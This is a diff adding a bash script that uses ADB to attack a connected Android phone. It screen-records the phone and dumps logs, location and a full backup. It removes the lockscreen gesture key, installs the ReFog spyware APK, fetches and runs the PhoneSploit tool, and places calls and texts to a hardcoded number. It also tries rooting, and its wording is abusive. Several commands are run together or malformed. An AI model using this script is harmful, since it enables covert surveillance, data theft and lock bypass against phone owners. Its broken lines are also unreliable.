@@ -1,0 +1,144 @@
+###################################
+##RPIADB AUTO EXECUTION SCRIPT##
+###################################
+#!/bin/bash
+echo “auto execute redpi adb usb android root script” 
+ssh pi@redpi:22
+echo “Welcome To RedPi Remote USB ADB Root Interface”
+sudo apt install git && cd /usr/local/bin
+sudo git clone https://github.com/DynamicDesignz/adb-auto.git 
+sudo chmod +x adb-auto
+sudo apt install adb
+echo “Executing ADB-Auto” | sudo adb-auto
+####adb-auto script####
+echo “Starting ADB Server...”
+sudo adb start server
+
+echo “getting list of devices and checking usb connection”
+adb wait-for-device
+adb devices
+adb get-state 
+adb get-serialno
+adb shell getprop ro.build.version.release 
+
+
+echo “SET PROFORMANCE TWEAKS”
+getprop
+getprop ro.build.version.sdkgetprop ro.chipname
+echo “set dns”
+setprop net.dns1 1.2.3.4setprop net.dns2 1.2.3.5
+echo “set speed heap size”
+setprop dalvik.vm.heapsize 40m
+
+
+
+adb shell input text 'Starting Screen Record!'
+adb shell screenrecord /sdcard/NotAbleToLogin.mp4
+adb pull /sdcard/NotAbleToLogin.mp4 /home
+
+echo “Get Screenshot”
+adb shell screencap -p /sdcard/screenshot.png
+adb pull  /sdcard/screenshot.png /home/path
+
+echo “Dump Phone Logs”
+adb logcat  -d > /path/to/logs && adb bugreport && adb jdwp && adb shell dumpsys
+adb pull /path/to/logs/device /var/log/Android
+
+
+echo “Dump Contacts...”
+
+echo “Dump Pictures....”
+
+echo “Dump Location Data”
+adb shell dumpsys location
+
+
+adb shell am start -a android.intent.action.VIEW
+adb shell am broadcast -a 'my_action'
+
+echo “copying full system backup”
+adb shell cp /data/system && adb backup -all -f /backup/location/file.ab
+
+echo “Get Screenshot of Lockscreen”
+adb shell screencap -p /sdcard/screenshot.png
+adb pull  /sdcard/screenshot.png /home/path
+echo “Remove Password Lockscreen”
+adb shell rm /data/system/gesture.key
+echo “Get Screenshot Of Unlock Screen”
+adb shell screencap -p /sdcard/screenshot.png
+adb pull  /sdcard/screenshot.png /home/path
+
+echo “Call Me Bitch!”
+adb shell am start -a android.intent.action.CALL -d tel:+15852018675
+
+echo “Text Me MoFo!”
+adb shell am start -a android.intent.action.SENDTO -d sms:+15852018675   --es  sms_body "Test --ez exit_on_sent false
+
+
+##############################################################
+
+echo “########################################”
+echo “ATTEMPTING ROOT PAYLOAD COMMAND STRINGS!”
+echo “########################################”
+           ##Steps to Root Device Via ADB...
+
+fastboot devices
+fastboot oem unlock
+fastboot reboot bootloader
+
+#adb bootloader oem unlock
+
+echo “side load twerp”
+adb sideload twrp.zip
+echo “flash fastboot boot image”
+fastboot flash boot boot_image.img
+
+
+#############################################################
+
+#echo “attempting to enable fast boot” | 
+#echo “adb connection over wifi” | nc 
+#echo “adb connection over bluetooth”
+
+
+echo “push spyware payload and install”
+adb push ReFogAndroid.apk /sdcard
+adb install ReFogAndroid.apk /sdcard
+adb shell pm grant ReFogAndroid.apk [ Permission]  // Grant a permission to an app. 
+
+
+startintent https://twitter.com/JonFHancock // Launch a deep link on all devices
+echo “Get Screenshot Of StartIntent Link On Device”
+adb shell screencap -p /sdcard/screenshot.png
+adb pull  /sdcard/screenshot.png /home/path
+
+cd /opt/
+sudo git clone https://github.com/Zucccs/PhoneSploit
+cd PhoneSploit
+pip install colorama
+echo “Open In New Terminal”
+bash 
+python2 main_linux.p
+
+
+echo “Fuck With Buttons”
+adb shell input keyevent 26  // Turn Android device ON and OFF. It will toggle device to on/off status.
+adb shell input keyevent 27 // Camera
+adb shell input keyevent 64 // Open browser
+adb shell input keyevent 66 // Enter
+adb shell input keyevent 67 // Delete (backspace)
+adb shell input keyevent 207 // Contacts
+adb shell input keyevent 220 / 221 // Brightness down/up
+
+
+echo “Android Denial Of Service Buffer Overflow Event Execution”
+adb shell monkey -p com.myAppPackage -v 10000 -s 100 
+// monkey tool is generating 10.000 random events on the real device
+
+echo “Reboot Recovery If System Fail”
+adb reboot recovery 
+adb reboot-bootloader
+
+adb kill-server
+done
+exit
